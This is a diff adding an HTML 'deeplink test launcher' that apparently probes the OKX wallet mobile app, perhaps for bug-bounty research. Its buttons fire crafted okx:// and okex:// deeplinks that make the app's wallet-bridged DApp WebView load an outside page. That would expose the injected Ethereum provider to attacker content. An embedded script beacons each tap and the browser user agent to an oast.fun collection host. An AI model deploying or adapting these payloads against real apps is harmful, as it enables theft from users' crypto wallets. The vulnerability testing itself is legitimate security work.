@@ -1,0 +1,114 @@
+<!doctype html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+<title>OKX deeplink launcher</title>
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:rgba(53,115,255,.5)}
+html,body{margin:0;background:#0b0b0c;color:#e8e8e8;font:14px/1.4 -apple-system,system-ui,sans-serif}
+.wrap{padding:14px}
+h1{font-size:16px;margin:0 0 6px}
+h2{font-size:13px;color:#999;margin:18px 0 6px;text-transform:uppercase;letter-spacing:.5px}
+small{color:#888;font-size:11px}
+a.btn{display:block;padding:14px;margin:8px 0;background:#3573ff;color:#fff;text-decoration:none;
+      border-radius:8px;font:13px/1.3 monospace;word-break:break-all;touch-action:manipulation}
+a.btn:active{background:#1e54d8}
+a.dapp{background:#16a34a}a.dapp:active{background:#0f7d36}
+a.nft{background:#9333ea}a.nft:active{background:#6b1cb0}
+a.ctrl{background:#525252}a.ctrl:active{background:#363636}
+.tag{display:inline-block;background:#000;padding:2px 6px;border-radius:4px;font-size:11px;margin-right:6px}
+pre{background:#111;padding:8px;border-radius:6px;font:11px monospace;
+    white-space:pre-wrap;word-break:break-all;max-height:30vh;overflow:auto}
+</style></head><body><div class="wrap">
+
+<h1>🎯 OKX deeplink test launcher</h1>
+<small>Tap each in order. Watch your Interactsh tab. Look for <b>HAS ethereum</b> beacons → Critical.</small>
+
+<h2>🟢 DApp WebView (wallet-bridged) — DAPP_DETAIL branch</h2>
+<small>These hit <code>openDAppBrowserWithDic</code> → should inject wallet provider</small>
+
+<a class="btn dapp" href="okx://wallet/dapp/details?dappUrl=https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D1">
+<span class="tag">v1</span>okx://wallet/dapp/details</a>
+
+<a class="btn dapp" href="okex://metaX/dapp/details?dappUrl=https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D2">
+<span class="tag">v2</span>okex://metaX/dapp/details</a>
+
+<a class="btn dapp" href="okx://web3/dapp/details?dappUrl=https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D3">
+<span class="tag">v3</span>okx://web3/dapp/details</a>
+
+<h2>🟢 DApp /details with extra params</h2>
+
+<a class="btn dapp" href="okx://wallet/dapp/details?dappUrl=https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D4&chainId=1">
+<span class="tag">v4</span>wallet/dapp/details + chainId=1</a>
+
+<a class="btn dapp" href="okx://wallet/dapp/details?dappUrl=https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D5&chainId=1&walletId=0">
+<span class="tag">v5</span>wallet/dapp/details + chainId + walletId</a>
+
+<a class="btn dapp" href="okx://wallet/dapp/details?dappUrl=https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D6&jumpType=direct">
+<span class="tag">v6</span>wallet/dapp/details + jumpType=direct</a>
+
+<a class="btn dapp" href="okex://metaX/dapp/details?dappUrl=https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D7&chainId=1&jumpType=direct">
+<span class="tag">v7</span>metaX/dapp/details full</a>
+
+<h2>🟢 DApp /dapp (no /details) — DAPP branch</h2>
+
+<a class="btn dapp" href="okx://wallet/dapp?dappUrl=https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D8&tabName=Featured">
+<span class="tag">v8</span>okx://wallet/dapp + tabName</a>
+
+<a class="btn dapp" href="okex://metaX/dapp?dappUrl=https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D9&tabName=Featured">
+<span class="tag">v9</span>okex://metaX/dapp + tabName</a>
+
+<a class="btn dapp" href="okx://web3/dapp?dappUrl=https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D10">
+<span class="tag">v10</span>okx://web3/dapp</a>
+
+<h2>🟣 NFT featured routes — possible DAppWebView paths</h2>
+
+<a class="btn nft" href="okx://wallet/nft/featured?page=cryptopedia&chainId=1&cryptopediaId=1&dappUrl=https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D11">
+<span class="tag">v11</span>nft/featured cryptopedia</a>
+
+<a class="btn nft" href="okx://wallet/nft/featured?page=cryptopediaDetail&chainId=1&cryptopediaId=1&dappUrl=https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D12">
+<span class="tag">v12</span>nft/featured cryptopediaDetail</a>
+
+<a class="btn nft" href="okx://wallet/nft/featured?page=cryptopediaTaskDetail&chainId=1&cryptopediaId=1&dappId=1&dappCategory=1&dappUrl=https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D13">
+<span class="tag">v13</span>nft/featured taskDetail</a>
+
+<a class="btn nft" href="okex://metaX/nft/featured?page=cryptopediaDetail&chainId=1&cryptopediaId=1&dappUrl=https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D14">
+<span class="tag">v14</span>metaX nft cryptopediaDetail</a>
+
+<a class="btn nft" href="okx://web3/nft/featured?page=cryptopediaDetail&chainId=1&cryptopediaId=1&dappUrl=https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D15">
+<span class="tag">v15</span>web3 nft cryptopediaDetail</a>
+
+<h2>🟣 NFT primary / event paths (server-data sinks)</h2>
+
+<a class="btn nft" href="okx://wallet/nft/primary/details?activityId=1&chainId=1">
+<span class="tag">v16</span>nft/primary/details (no dappUrl - just to see what loads)</a>
+
+<a class="btn nft" href="okx://wallet/nft/featured?page=event_detail&eventId=1&dappUrl=https%3A%2F%2Fnayssers.github.io%2Fdrave.html%3Fv%3D17">
+<span class="tag">v17</span>event_detail</a>
+
+<h2>⚪ Control — known-working /goto/web (Web only, no bridge)</h2>
+
+<a class="btn ctrl" href="okex://miniapp?appid=finance&pageurl=%2Fgoto%2Fweb%3Furl%3Dhttps%253A%252F%252Fnayssers.github.io%252Fdrave.html%253Fv%253D99">
+<span class="tag">v99</span>finance miniapp /goto/web (control)</a>
+
+<h2>📋 Last beacons</h2>
+<pre id=log>—\n</pre>
+
+<script>
+var COLLECT='https://xdhrflssxhuownkbsbgks7myap3kv1oo6.oast.fun/c';
+function w(s){
+  var l=document.getElementById('log');
+  l.textContent=('['+new Date().toISOString().slice(11,19)+'] '+s+'\n')+l.textContent;
+  try{navigator.sendBeacon(COLLECT+'?launcher='+encodeURIComponent(s));}catch(e){}
+}
+w('launcher loaded UA='+navigator.userAgent.slice(0,80));
+// tag every tap before navigation so we know which one fired
+document.querySelectorAll('a.btn').forEach(function(a){
+  a.addEventListener('click', function(){
+    var tag = this.querySelector('.tag').textContent;
+    var href = this.getAttribute('href');
+    w('TAP '+tag+' → '+href.slice(0,90));
+  });
+});
+</script>
+</div></body></html>
